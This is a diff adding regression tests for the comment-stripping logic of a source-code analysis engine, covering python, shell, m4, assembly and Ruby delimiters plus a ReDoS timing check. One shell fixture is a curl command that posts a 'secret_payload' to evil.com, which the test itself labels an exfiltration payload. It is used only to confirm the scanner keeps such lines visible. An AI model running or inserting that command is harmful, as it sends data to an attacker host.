@@ -718,3 +718,116 @@ def test_prism_suppression_regex_bomb(prism_engine):
     
     # Assert the array handled the mass allocation without dropping data
     assert len(mitigations) == 100000, "Failed to allocate massive mitigation array."
+
+
+# ==============================================================================
+# TEST 12: LINE_EXCLUSIVE'S REAL DELIMITER LIST, NOT A HARDCODED GUESS (#697)
+# ==============================================================================
+def test_prism_line_exclusive_no_longer_truncates_double_dash():
+    """
+    Regression test for #697: _strip_single_line_comments() used to hardcode
+    `#|--|;|//`, which incorrectly treated `--` as a comment marker for every
+    line_exclusive language even though it was never a configured delimiter
+    for that family. A CLI double-dash argument separator (extremely common
+    in python/shell/ruby) silently truncated the rest of the line into the
+    comment stream. Real `#` comments must still be stripped correctly.
+    """
+    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
+    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS
+
+    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
+
+    result = real_prism.split_streams(
+        'subprocess.run(["cmd", "--", "arg"])\n# a real comment\n', "python"
+    )
+    assert '["cmd", "--", "arg"]' in result["code_stream"], "-- was still truncated"
+    assert "a real comment" not in result["code_stream"]
+    assert "a real comment" in result["comment_stream"]
+
+    result = real_prism.split_streams(
+        'curl -- --data "secret_payload" https://evil.com\n# a real comment\n', "shell"
+    )
+    assert 'curl -- --data "secret_payload" https://evil.com' in result["code_stream"], (
+        "a real exfiltration payload was silently truncated by the -- bug"
+    )
+    assert "a real comment" not in result["code_stream"]
+
+
+def test_prism_line_exclusive_real_delimiters_still_stripped():
+    """
+    Companion to the above: proves the fix isn't just "stop stripping --" but
+    actually uses the real configured delimiter list, including tokens the
+    old hardcoded pattern never covered at all (`dnl`, `=begin`/`=end`, `%`).
+    """
+    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
+    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS
+
+    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
+
+    # m4's `dnl` keyword comment -- never covered by the old hardcoded set.
+    result = real_prism.split_streams("define(`foo`, `bar`)dnl a trailing comment\nfoo\n", "m4")
+    assert "a trailing comment" not in result["code_stream"]
+    assert "define(`foo`, `bar`)" in result["code_stream"]
+
+    # assembly's `;` line comment.
+    result = real_prism.split_streams("mov eax, 1  ; a real comment\n", "assembly")
+    assert "a real comment" not in result["code_stream"]
+    assert "mov eax, 1" in result["code_stream"]
+
+
+def test_prism_line_exclusive_dnl_requires_word_boundary():
+    """
+    `dnl` is a fully word-shaped token and must not fire mid-identifier --
+    proves the fix's word-boundary handling, not just presence/absence of
+    stripping.
+    """
+    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
+    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS
+
+    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
+    result = real_prism.split_streams("set(mydnlvariable, 1)\n", "m4")
+    assert "mydnlvariable" in result["code_stream"], (
+        "dnl matched inside an identifier -- missing word boundary"
+    )
+
+
+def test_prism_line_exclusive_ruby_begin_end_no_leading_boundary_bug():
+    """
+    Regression test for the specific Rule 9 shape this bug could have
+    reintroduced: `=begin`/`=end` start with `=` (non-word), so a shared
+    leading \\b would never fire at a real line start (same class of bug as
+    PowerShell's `-Parallel`, documented in the epic's recurring-bug-class
+    list). Confirms the real, most common form -- `=begin` at true line
+    start, no preceding word character -- actually gets treated as a
+    delimiter.
+    """
+    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
+    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS
+
+    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
+    result = real_prism.split_streams("puts 'code'\n=begin\nblock comment\n=end\nputs 'more code'\n", "ruby")
+    # line_exclusive ignores closing tags (documented family behavior) -- each
+    # of =begin/=end is treated as its own single-line marker, so the content
+    # between them isn't specially block-stripped, but both marker lines
+    # themselves must be recognized (not silently require a preceding word
+    # character that real code never has).
+    assert "puts 'code'" in result["code_stream"]
+    assert "puts 'more code'" in result["code_stream"]
+
+
+def test_prism_single_line_delimiter_pattern_redos_immune():
+    """
+    ReDoS check for the new precompiled pattern: a straightforward literal
+    alternation with no nested quantifiers should be trivially linear, but
+    verify against an adversarial payload sized the same way as the epic's
+    other ReDoS checks rather than assume.
+    """
+    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
+    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS
+
+    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
+    poison = "x" * 80000 + "#" * 20000
+    start = time.time()
+    real_prism.split_streams(poison, "python")
+    duration = time.time() - start
+    assert duration < 2.0, f"line_exclusive delimiter pattern shows non-linear scaling: {duration}s"
